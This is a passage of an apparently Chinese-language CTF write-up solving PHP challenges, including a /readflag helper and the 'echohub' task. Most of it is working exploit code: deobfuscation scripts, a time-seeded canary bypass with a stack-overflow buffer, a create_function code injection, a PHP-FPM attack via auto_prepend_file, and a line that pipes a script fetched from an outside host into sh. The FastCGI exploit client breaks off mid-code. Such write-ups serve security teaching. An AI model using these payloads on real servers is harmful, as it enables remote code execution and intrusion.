class="number">1024</span>);</span><br><span class="line">$a = fread($pipes[<span class="number">1</span>], <span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">$a = explode(<span class="string">"\n"</span>, $a);</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"\$result=$a[0];"</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="string">"\$result=$a[0];"</span>);</span><br><span class="line"></span><br><span class="line">fwrite($pipes[<span class="number">0</span>], <span class="string">"$result\n"</span>);</span><br><span class="line"></span><br><span class="line">var_dump(fread($pipes[<span class="number">1</span>], <span class="number">1024</span>));</span><br><span class="line">var_dump(fread($pipes[<span class="number">1</span>], <span class="number">1024</span>));</span><br><span class="line">var_dump(fread($pipes[<span class="number">1</span>], <span class="number">1024</span>));</span><br><span class="line"></span><br><span class="line">fclose($pipes[<span class="number">0</span>]);</span><br><span class="line">fclose($pipes[<span class="number">1</span>]);</span><br><span class="line">$return_value = proc_close($proess);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"command returned $return_value\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>å®˜æ–¹ä½¿ç”¨å¦‚ä¸‹perlè„šæœ¬è¿›è¡Œè§£ç­”<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> IPC::Open3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $pid = open3(\*CHLD_IN, \*CHLD_OUT, \*CHLD_ERR, <span class="string">'/readflag'</span>) <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">"open3() failed $!"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $r;</span><br><span class="line"></span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r=<span class="keyword">eval</span> <span class="string">"$r"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r\n"</span>;</span><br><span class="line"><span class="keyword">print</span> CHLD_IN <span class="string">"$r\n"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br></pre></td></tr></table></figure></p><h3 id="2-echohub"><a href="#2-echohub" class="headerlink" title="2. echohub"></a>2. echohub</h3><h4 id="0-ä»£ç è§£å¯†-amp-æºä»£ç æè¿°çš„æ ˆæƒ…å†µè§£è¯»"><a href="#0-ä»£ç è§£å¯†-amp-æºä»£ç æè¿°çš„æ ˆæƒ…å†µè§£è¯»" class="headerlink" title="0. ä»£ç è§£å¯†&amp;æºä»£ç æè¿°çš„æ ˆæƒ…å†µè§£è¯»"></a>0. ä»£ç è§£å¯†&amp;æºä»£ç æè¿°çš„æ ˆæƒ…å†µè§£è¯»</h4><ol><li>è¿™ä¸ªbase64ç¼–ç çš„è„šæœ¬ä¸­æ˜¯å«æœ‰è„æ•°æ®çš„å’Œä¸€äº›ç‰¹æ®Šå­—ç¬¦çš„ï¼Œç›´æ¥ä½¿ç”¨ç¼–è¾‘å™¨ç¼–è¾‘å¯èƒ½ä¼šæœ‰ä¸€äº›é—®é¢˜ï¼Œæ‰€ä»¥æˆ‘åœ¨æ­¤å…ˆä½¿ç”¨è„šæœ¬å°†å…¶è§£ç ä¹‹åä½¿ç”¨äºŒè¿›åˆ¶ç¼–è¾‘å™¨010editorè¿›è¡Œç¼–è¾‘</li></ol><p>è„šæœ¬å¦‚ä¸‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">echo &apos;base64_encode_phpcode_value&apos; | base64 -D &gt; ./log</span><br></pre></td></tr></table></figure></p><p>ä½¿ç”¨010editoræ‰“å¼€</p><p><img src="https://i.loli.net/2019/09/15/BOgRCjHeoE92Wb5.png" alt="212B5D86-CE77-4CAE-B610-E183EBE9FAB2.png"></p><ol start="2"><li>åœ¨010editorç¼–è¾‘å™¨ä¸­æ‰‹åŠ¨åˆ é™¤ä¸€ä¸‹è„æ•°æ®</li><li>ä½¿ç”¨phptorm/vscodeè¿›è¡ŒåŠ¨æ€è°ƒè¯•æˆ–è€…ä½¿ç”¨<code>var_export</code>æ¥å¯¹è¿™é‡Œçš„å˜é‡æ›¿æ¢è¡¨è¿›è¡Œåˆ†æ</li></ol><p><img src="https://i.loli.net/2019/09/15/T1F49IzKfStcaqM.png" alt="F4897E52-CFD9-4391-9C20-A18CFCF0AB68.png"><br>å¯ä»¥çœ‹åˆ°å¯¹åº”çš„å˜é‡è¡¨ï¼Œä¹‹åå†™ä¸€ä¸ªè„šæœ¬æ¥å¯¹åŠ å¯†çš„PHPæ–‡ä»¶è¿›è¡Œå¤„ç†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'index.php'</span>;<span class="comment">// index.phpä¸ºè¢«åŠ å¯†çš„æ–‡ä»¶</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replaceString</span><span class="params">($match)</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $O;</span><br><span class="line">    $index = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">false</span> !== strpos($match[<span class="number">1</span>], <span class="string">'x'</span>))&#123;</span><br><span class="line">        $index = hexdec($match[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $index = $match[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( function_exists($O[$index]) || class_exists($O[$index]) || defined($O[$index]) )&#123;</span><br><span class="line">        <span class="keyword">return</span> $O[$index];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"'"</span>.addslashes($O[$index]).<span class="string">"'"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$encrypto_string = file_get_contents(<span class="string">'index.php'</span>);</span><br><span class="line">$encrypto_string = preg_replace_callback(<span class="string">'/\$GLOBALS[\[\&#123;]O0[\]\&#125;][\[\&#123;](\w&#123;1,15&#125;)[\]\&#125;]/'</span>,<span class="string">'replaceString'</span>,$encrypto_string);</span><br><span class="line">$decrypto_string = preg_replace_callback(<span class="string">'/\$[O0]*[\[\&#123;](\w&#123;2,15&#125;)[\]\&#125;]/'</span>,<span class="string">'replaceString'</span>,$encrypto_string);</span><br><span class="line">file_put_contents(<span class="string">'decrypted.php'</span>, $decrypto_string);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>PS: æ­¤å¤„æœ‰ä¸ªå‘ç‚¹ï¼Œä½¿ç”¨sublimeæ‰“å¼€010editorå¤„ç†åçš„ä»£ç æ˜¯ä¸€å †16è¿›åˆ¶ï¼Œä½†æ˜¯ä½¿ç”¨vscodeæ‰“å¼€å°±é—®é¢˜ã€‚</p><h4 id="1-é˜²æŠ¤ç»•è¿‡-amp-æ ˆæº¢å‡º"><a href="#1-é˜²æŠ¤ç»•è¿‡-amp-æ ˆæº¢å‡º" class="headerlink" title="1. é˜²æŠ¤ç»•è¿‡&amp;æ ˆæº¢å‡º"></a>1. é˜²æŠ¤ç»•è¿‡&amp;æ ˆæº¢å‡º</h4><p>æ— è®ºæ˜¯aslrå’Œcanaryçš„é˜²æŠ¤éƒ½æ˜¯åŸºäºsrand()çš„ï¼Œè€Œç§å­æ˜¯time()ï¼Œæˆ‘ä»¬åªè¦æ—¶åŒºä¸€æ ·ï¼Œé‚£ä¹ˆæœ¬åœ°å’Œç›®æ ‡çš„time()çš„ç»“æœå°±æ˜¯ä¸€æ ·çš„ï¼Œå› è€Œå¯ä»¥é¢„æµ‹ï¼Œè¿›è€Œç»•è¿‡ç›®æ ‡çš„é˜²æŠ¤æœºåˆ¶ã€‚</p><p>æ­¤å¤„æˆ‘ä»¬çš„æ—¶åŒºå’Œç›®æ ‡ä¸»æœºæ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„time()æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯å¦‚æœä¸ä¸€æ ·ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¦‚ä¸‹ä»£ç æ¥ä»phpinfoè·å–å¯¹åº”çš„æ—¶é—´ç§å­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line">define(<span class="string">'TARGET'</span>, <span class="string">'http://34.85.27.91:10080/'</span>);</span><br><span class="line"><span class="comment">// init random generator</span></span><br><span class="line">$client = <span class="keyword">new</span> GuzzleHttp\Client();</span><br><span class="line">$res = $client-&gt;request(<span class="string">'POST'</span>, TARGET, [</span><br><span class="line">  <span class="string">'form_params'</span> =&gt; [<span class="string">'data'</span> =&gt; <span class="string">'aaaa'</span>]</span><br><span class="line">]);</span><br><span class="line">preg_match(<span class="string">"/REQUEST_TIME'[^0-9]+(\d+)/"</span>, $res-&gt;getBody(), $matches);</span><br><span class="line">srand((int)$matches[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>æ ˆæº¢å‡ºè¦†ç›–ä¹‹åè®°å¾—æŠŠcanaryå¯¹åº”çš„å€¼å¡«ä¸Šå°±å¥½äº†ï¼Œæ ˆçš„æƒ…å†µå¦‚ä¸‹</p><table><thead><tr><th>7777</th><th>POSTå‚æ•°2</th></tr></thead><tbody><tr><td>6666</td><td>POSTå‚æ•°1</td></tr><tr><td>2</td><td>å‚æ•°çš„æ•°é‡</td></tr><tr><td>phpinfoåœ°å€</td><td>retåœ°å€</td></tr><tr><td>EBP</td><td></td></tr><tr><td>canary</td><td></td></tr><tr><td>AAAAAAA</td><td></td></tr><tr><td>DATA:AAA</td><td>ESP</td></tr></tbody></table><p>å› æ­¤å¯¹åº”çš„ç¼“å†²åŒºçš„å®Œæ•´æ„é€ å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = str_repeat( <span class="string">'A'</span>, $padding_num ) . hexToStr( strrev( $canarycheck ) ) . <span class="string">"BBBB"</span> . hexToStr( strrev( dechex( $func_[<span class="string">'create_function'</span>] ) ) ) . <span class="string">'000266667777'</span>;</span><br></pre></td></tr></table></figure><h4 id="2-ä»£ç æ³¨å…¥"><a href="#2-ä»£ç æ³¨å…¥" class="headerlink" title="2. ä»£ç æ³¨å…¥"></a>2. ä»£ç æ³¨å…¥</h4><blockquote><p>å‚è€ƒè‡ªï¼š<a href="https://www.exploit-db.com/exploits/32417" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/32417</a></p></blockquote><p>å…¶å®å°±æ˜¯ä½¿ç”¨disable_functionsæ²¡æœ‰åŒ…å«çš„<code>create_function</code>è¿›è¡Œä»£ç æ³¨å…¥é€ æˆä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯è¦æ³¨æ„çš„æ˜¯ï¼ŒåŠæ—¶æˆ‘ä»¬å¯ä»¥æ³¨å…¥ä»»æ„ä»£ç ï¼Œä½†æ˜¯è¿™æ ·çš„ç¯å¢ƒä¾æ—§å—åˆ°disable_functionsçš„åˆ¶çº¦ï¼Œé€ æˆç¯å¢ƒååˆ†å—é™</p><h4 id="3-æ”»å‡»fpm"><a href="#3-æ”»å‡»fpm" class="headerlink" title="3. æ”»å‡»fpm"></a>3. æ”»å‡»fpm</h4><p>ä¸ºä»€ä¹ˆè¦æ”»å‡»fpmï¼Ÿå› ä¸ºæˆ‘ä»¬é€šè¿‡<code>create_function</code>å¾—åˆ°çš„æ˜¯ä¸€ä¸ªå—é™çš„shellï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åŠæ³•çªç ´è¿™ä¸ªç¯å¢ƒçš„é™åˆ¶</p><blockquote><p>ä½†PHPæ˜¯ä¸€é—¨å¼ºå¤§çš„è¯­è¨€ï¼ŒPHP.INIä¸­æœ‰ä¸¤ä¸ªæœ‰è¶£çš„é…ç½®é¡¹ï¼Œauto_prepend_fileå’Œauto_append_fileã€‚</p><p>auto_prepend_fileæ˜¯å‘Šè¯‰PHPï¼Œåœ¨æ‰§è¡Œç›®æ ‡æ–‡ä»¶ä¹‹å‰ï¼Œå…ˆåŒ…å«auto_prepend_fileä¸­æŒ‡å®šçš„æ–‡ä»¶ï¼›auto_append_fileæ˜¯å‘Šè¯‰PHPï¼Œåœ¨æ‰§è¡Œå®Œæˆç›®æ ‡æ–‡ä»¶åï¼ŒåŒ…å«auto_append_fileæŒ‡å‘çš„æ–‡ä»¶ã€‚</p><p>é‚£ä¹ˆå°±æœ‰è¶£äº†ï¼Œå‡è®¾æˆ‘ä»¬è®¾ç½®auto_prepend_fileä¸ºphp://inputï¼Œé‚£ä¹ˆå°±ç­‰äºåœ¨æ‰§è¡Œä»»ä½•phpæ–‡ä»¶å‰éƒ½è¦åŒ…å«ä¸€éPOSTçš„å†…å®¹ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠå¾…æ‰§è¡Œçš„ä»£ç æ”¾åœ¨Bodyä¸­ï¼Œä»–ä»¬å°±èƒ½è¢«æ‰§è¡Œäº†ã€‚ï¼ˆå½“ç„¶ï¼Œè¿˜éœ€è¦å¼€å¯è¿œç¨‹æ–‡ä»¶åŒ…å«é€‰é¡¹allow_url_includeï¼‰</p></blockquote><p>å¼•ç”¨è‡ªï¼š<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">ã€ŠFastcgiåè®®åˆ†æ &amp;&amp; PHP-FPMæœªæˆæƒè®¿é—®æ¼æ´ &amp;&amp; Expç¼–å†™ã€‹</a></p><p>ä¹‹åå°±æ˜¯åˆ©ç”¨è¿™ä¸ªæ¼æ´è€å¸®åŠ©æˆ‘ä»¬æ‰§è¡Œå‘½ä»¤ï¼Œæƒ³è¦æ‰§è¡Œçš„ä»£ç å¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">'curl http://ebcece08.w1n.pw/getflag | sh'</span>);<span class="keyword">die</span>(<span class="string">'zeroyu'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>getflagçš„å†…å®¹å¦‚ä¸‹<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">id;</span><br><span class="line">ls /;</span><br><span class="line">/readflag</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"         "</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'dXNlIHN0cmljdDsKdXNlIElQQzo6T3BlbjM7CgpteSAkcGlkID0gb3BlbjMoXCpDSExEX0lOLCBcKkNITERfT1VULCBcKkNITERfRVJSLCAnL3JlYWRmbGFnJykgb3IgZGllICJvcGVuMygpIGZhaWxlZCAkISI7CgpteSAkcjsKCiRyID0gPENITERfT1VUPjsKcHJpbnQgIiRyIjsKJHIgPSA8Q0hMRF9PVVQ+OwpwcmludCAiJHIiOwokcj1ldmFsICIkciI7CnByaW50ICIkclxuIjsKcHJpbnQgQ0hMRF9JTiAiJHJcbiI7CiRyID0gPENITERfT1VUPjsKcHJpbnQgIiRyIjsKJHIgPSA8Q0hMRF9PVVQ+OwpwcmludCAiJHIiOw=='</span>|base64 -d | perl</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"         "</span>;</span><br></pre></td></tr></table></figure></p><p>è¢«base64ç¼–ç çš„å†…å®¹å¦‚ä¸‹<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> IPC::Open3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $pid = open3(\*CHLD_IN, \*CHLD_OUT, \*CHLD_ERR, <span class="string">'/readflag'</span>) <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">"open3() failed $!"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $r;</span><br><span class="line"></span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r=<span class="keyword">eval</span> <span class="string">"$r"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r\n"</span>;</span><br><span class="line"><span class="keyword">print</span> CHLD_IN <span class="string">"$r\n"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br></pre></td></tr></table></figure></p><p>PS: è¿™ç§è¿œç¨‹ä¸‹è½½æ‰§è¡Œçš„æ–¹æ³•å¯ä»¥æœ‰æ•ˆç¼©çŸ­æ‰§è¡Œä»£ç çš„é•¿åº¦</p><p>æ”»å‡»ä»£ç çš„ç”Ÿæˆ<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line">PY2 = <span class="literal">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bchr</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line">        <span class="keyword">return</span> force_bytes(chr(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> bytes([i])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bord</span><span class="params">(c)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(c, int):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> ord(c)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_bytes</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_text</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> issubclass(type(s), str):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        s = str(s, <span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = str(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FastCGIClient</span>:</span></span><br><span class="line">    <span class="string">"""A Fast-CGI Client for Python"""</span></span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, host, port, timeout, keepalive)</span>:</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            self.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.keepalive = <span class="number">0</span></span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line">        self.requests = dict()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__connect</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(self.timeout)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span 